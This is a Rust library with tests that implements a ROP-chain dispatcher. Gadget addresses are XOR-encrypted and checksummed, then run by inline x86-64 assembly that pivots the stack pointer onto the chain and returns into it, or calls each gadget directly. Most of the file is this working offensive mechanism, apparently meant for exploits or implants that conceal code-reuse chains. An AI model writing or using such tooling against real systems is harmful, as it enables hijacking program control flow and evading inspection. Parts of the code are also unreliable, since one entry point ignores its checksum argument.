use core::arch::asm;

#[derive(Debug, Clone)]
pub struct RopDispatchChain {
    encrypted: Vec<u8>,
    key: [u8; 32],
    expected_checksum: u64,
    chain: Vec<u64>,
    verified: bool,
}

#[derive(Debug, Clone)]
pub struct DispatchStep {
    pub index: usize,
    pub address: u64,
    pub total: usize,
}

impl RopDispatchChain {
    pub fn new(encrypted: Vec<u8>, key: [u8; 32], expected_checksum: u64) -> Self {
        Self {
            encrypted,
            key,
            expected_checksum,
            chain: Vec::new(),
            verified: false,
        }
    }

    pub fn from_raw(chain: Vec<u64>) -> Self {
        let checksum = chain.iter().fold(0u64, |acc, &v| acc.wrapping_mul(31).wrapping_add(v));
        Self {
            encrypted: Vec::new(),
            key: [0u8; 32],
            expected_checksum: checksum,
            chain,
            verified: true,
        }
    }

    fn decrypt(&self) -> Vec<u64> {
        let decrypted: Vec<u8> = self.encrypted
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ self.key[i % 32])
            .collect();
        decrypted
            .chunks_exact(8)
            .map(|c| u64::from_le_bytes(c.try_into().unwrap()))
            .collect()
    }

    fn compute_checksum(chain: &[u64]) -> u64 {
        chain.iter().fold(0u64, |acc, &v| acc.wrapping_mul(31).wrapping_add(v))
    }

    pub fn verify_integrity(&mut self) -> bool {
        if self.encrypted.is_empty() && !self.chain.is_empty() {
            let cksum = Self::compute_checksum(&self.chain);
            self.verified = cksum == self.expected_checksum;
            return self.verified;
        }

        if self.encrypted.len() % 8 != 0 {
            self.verified = false;
            return false;
        }

        let chain = self.decrypt();
        let cksum = Self::compute_checksum(&chain);
        if cksum != self.expected_checksum {
            self.verified = false;
            return false;
        }

        self.chain = chain;
        self.verified = true;
        true
    }

    pub fn is_verified(&self) -> bool {
        self.verified
    }

    pub fn chain_len(&self) -> usize {
        self.chain.len()
    }

    pub fn chain(&self) -> &[u64] {
        &self.chain
    }

    pub fn dispatch(&self) -> Result<u64, String> {
        if !self.verified {
            return Err("Chain not verified".to_string());
        }
        if self.chain.is_empty() {
            return Err("Empty chain".to_string());
        }

        let result: u64;
        let chain_ptr = self.chain.as_ptr() as u64;

        #[cfg(target_arch = "x86_64")]
        unsafe {
            asm!(
                "mov r15, rsp",
                "mov rsp, {chain}",
                "ret",
                "mov rsp, r15",
                chain = in(reg) chain_ptr,
                out("rax") result,
                out("r15") _,
                clobber_abi("C"),
            );
        }

        #[cfg(not(target_arch = "x86_64"))]
        {
            let _ = chain_ptr;
            result = 0;
        }

        Ok(result)
    }

    pub fn step_iter(&self) -> DispatchStepIter<'_> {
        DispatchStepIter {
            chain: &self.chain,
            index: 0,
        }
    }

    pub fn dispatch_next(&self, step: &DispatchStep) -> Result<DispatchStep, String> {
        if !self.verified {
            return Err("Chain not verified".to_string());
        }
        if step.index >= self.chain.len() {
            return Err("No more gadgets".to_string());
        }

        let addr = self.chain[step.index];

        #[cfg(target_arch = "x86_64")]
        unsafe {
            asm!(
                "call {addr}",
                addr = in(reg) addr,
                clobber_abi("C"),
            );
        }

        #[cfg(not(target_arch = "x86_64"))]
        {
            let _ = addr;
        }

        Ok(DispatchStep {
            index: step.index + 1,
            address: addr,
            total: self.chain.len(),
        })
    }
}

pub struct DispatchStepIter<'a> {
    chain: &'a [u64],
    index: usize,
}

impl<'a> Iterator for DispatchStepIter<'a> {
    type Item = DispatchStep;

    fn next(&mut self) -> Option<Self::Item> {
        if self.index >= self.chain.len() {
            return None;
        }
        let step = DispatchStep {
            index: self.index,
            address: self.chain[self.index],
            total: self.chain.len(),
        };
        self.index += 1;
        Some(step)
    }
}

pub fn dispatch_rop_chain(encrypted: &[u8], key: &[u8; 32], expected_checksum: u64) -> Result<u64, String> {
    let mut chain = RopDispatchChain::new(encrypted.to_vec(), *key, expected_checksum);
    if !chain.verify_integrity() {
        return Err("Integrity check failed".to_string());
    }
    chain.dispatch()
}

pub fn dispatch_rop_chain_raw(chain: Vec<u64>, expected_checksum: u64) -> Result<u64, String> {
    let mut dc = RopDispatchChain::from_raw(chain);
    if !dc.verify_integrity() {
        return Err("Integrity check failed".to_string());
    }
    dc.dispatch()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rop_dispatch_new() {
        let chain = RopDispatchChain::new(
            vec![0u8; 16],
            [0xABu8; 32],
            0,
        );
        assert!(!chain.is_verified());
        assert_eq!(chain.chain_len(), 0);
    }

    #[test]
    fn test_rop_dispatch_from_raw() {
        let chain = RopDispatchChain::from_raw(vec![0x401000, 0x401002]);
        assert!(chain.is_verified());
        assert_eq!(chain.chain_len(), 2);
    }

    #[test]
    fn test_verify_integrity_encrypted() {
        let raw: Vec<u64> = vec![0x401000, 0x401002, 0x401004];
        let key = [0xABu8; 32];
        let encrypted: Vec<u8> = raw.iter()
            .flat_map(|v| v.to_le_bytes())
            .enumerate()
            .map(|(i, b)| b ^ key[i % 32])
            .collect();
        let checksum = raw.iter().fold(0u64, |acc, &v| acc.wrapping_mul(31).wrapping_add(v));

        let mut chain = RopDispatchChain::new(encrypted, key, checksum);
        assert!(chain.verify_integrity());
        assert!(chain.is_verified());
        assert_eq!(chain.chain(), &raw);
    }

    #[test]
    fn test_verify_integrity_wrong_checksum() {
        let raw: Vec<u64> = vec![0x401000];
        let key = [0xABu8; 32];
        let encrypted: Vec<u8> = raw.iter()
            .flat_map(|v| v.to_le_bytes())
            .enumerate()
            .map(|(i, b)| b ^ key[i % 32])
            .collect();

        let mut chain = RopDispatchChain::new(encrypted, key, 0xDEADBEEF);
        assert!(!chain.verify_integrity());
        assert!(!chain.is_verified());
    }

    #[test]
    fn test_verify_integrity_wrong_key() {
        let raw: Vec<u64> = vec![0x401000];
        let key_enc = [0xABu8; 32];
        let key_dec = [0xCDu8; 32];
        let encrypted: Vec<u8> = raw.iter()
            .flat_map(|v| v.to_le_bytes())
            .enumerate()
            .map(|(i, b)| b ^ key_enc[i % 32])
            .collect();
        let checksum = raw.iter().fold(0u64, |acc, &v| acc.wrapping_mul(31).wrapping_add(v));

        let mut chain = RopDispatchChain::new(encrypted, key_dec, checksum);
        assert!(!chain.verify_integrity());
        assert!(!chain.is_verified());
    }

    #[test]
    fn test_dispatch_chain_empty_fails() {
        let result = dispatch_rop_chain(&[], &[0u8; 32], 0);
        assert!(result.is_err());
    }

    #[test]
    fn test_step_iter() {
        let chain = RopDispatchChain::from_raw(vec![0x401000, 0x401002, 0x401004]);
        let steps: Vec<DispatchStep> = chain.step_iter().collect();
        assert_eq!(steps.len(), 3);
        assert_eq!(steps[0].address, 0x401000);
        assert_eq!(steps[1].address, 0x401002);
        assert_eq!(steps[2].address, 0x401004);
        assert_eq!(steps[0].index, 0);
        assert_eq!(steps[1].index, 1);
        assert_eq!(steps[2].index, 2);
    }

    #[test]
    fn test_step_iter_empty() {
        let chain = RopDispatchChain::from_raw(vec![]);
        let steps: Vec<DispatchStep> = chain.step_iter().collect();
        assert!(steps.is_empty());
    }

    #[test]
    fn test_dispatch_chain_raw() {
        let raw = vec![0x401000, 0xC3];
        let checksum = raw.iter().fold(0u64, |acc, &v| acc.wrapping_mul(31).wrapping_add(v));
        let dc = RopDispatchChain::from_raw(raw);
        assert!(dc.is_verified());
        assert_eq!(dc.chain_len(), 2);
        assert_eq!(dc.chain()[0], 0x401000);
        assert_eq!(dc.chain()[1], 0xC3);
    }

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let raw: Vec<u64> = vec![0x401000, 0x401002];
        let key = [0xABu8; 32];
        let encrypted: Vec<u8> = raw.iter()
            .flat_map(|v| v.to_le_bytes())
            .enumerate()
            .map(|(i, b)| b ^ key[i % 32])
            .collect();
        let checksum = raw.iter().fold(0u64, |acc, &v| acc.wrapping_mul(31).wrapping_add(v));

        let mut chain = RopDispatchChain::new(encrypted, key, checksum);
        assert!(chain.verify_integrity());
        let decrypted = chain.chain();
        assert_eq!(decrypted, &raw);
    }

    #[test]
    fn test_dispatch_not_verified_fails() {
        let chain = RopDispatchChain::new(vec![0u8; 16], [0u8; 32], 0);
        let result = chain.dispatch();
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), "Chain not verified");
    }

    #[test]
    fn test_dispatch_next_not_verified_fails() {
        let chain = RopDispatchChain::new(vec![0u8; 16], [0u8; 32], 0);
        let step = DispatchStep { index: 0, address: 0, total: 1 };
        let result = chain.dispatch_next(&step);
        assert!(result.is_err());
    }

    #[test]
    fn test_dispatch_next_empty() {
        let chain = RopDispatchChain::from_raw(vec![0x401000]);
        let step = DispatchStep { index: 1, address: 0x401000, total: 1 };
        let result = chain.dispatch_next(&step);
        assert!(result.is_err());
    }
}
